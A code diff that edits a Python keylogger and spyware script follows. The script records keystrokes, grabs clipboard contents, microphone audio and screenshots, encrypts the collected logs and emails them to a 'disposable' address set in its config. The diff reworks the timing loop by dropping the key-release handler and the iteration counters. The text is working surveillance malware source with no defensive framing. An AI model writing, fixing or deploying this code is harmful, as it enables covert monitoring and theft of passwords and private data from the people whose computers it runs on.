@@ -42,7 +42,6 @@ wifi_information_e = config["wifi_information_e"]
 
 microphone_time = config["microphone_time"]
 time_iteration = config["time_iteration"]
-number_of_iterations_end = config["number_of_iterations_end"]
 
 email_address = config["email_address"] # Enter disposable email here
 password = config["password"] # Enter email password here
@@ -242,42 +241,27 @@ def write_file(keys):
             
 #keylogger key recording function                
 def on_press(key):
-    global keys, count, currentTime
+    global keys, count
     keys.append(key)
     count += 1
-    currentTime = time.time()
     if count >= 1:
         count = 0
         write_file(keys)
         keys =[]
         
-#keylogger time keeping function        
-def on_release(key):
-    if currentTime > stoppingTime:
-        return False
-
-number_of_iterations = 0
-encryption_done = False
-sent_done = False
-count = 0
-keys =[] 
-threads = []
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
-threads.extend([ threading.Thread(target=copy_clipboard),
-                threading.Thread(target=microphone),
-                threading.Thread(target=screenshot)])
-for thread in threads:
-    thread.start()
 
 count = 0
 threads = []
+keys = []
 encrypt_thread = threading.Thread(target=encryption)
 send_thread = threading.Thread(target=send_email,args=(encrypted_system_files, "LOG FILES", "Encrypted Files attached"))
-# counter for keylogger
+currentTime = time.time()
+stoppingTime = currentTime + time_iteration
+
+# timer
 while currentTime < stoppingTime:
     
-    with Listener(on_press=on_press, on_release=on_release) as listener:
+    with Listener(on_press=on_press) as listener:
         listener.join()
         
     if not encrypt_thread.is_alive(): 
@@ -303,7 +287,6 @@ while currentTime < stoppingTime:
             encrypt_thread.start()
     
     currentTime = time.time()
-    stoppingTime = time.time() + time_iteration
                             
 send_thread.join()
 t3.join()
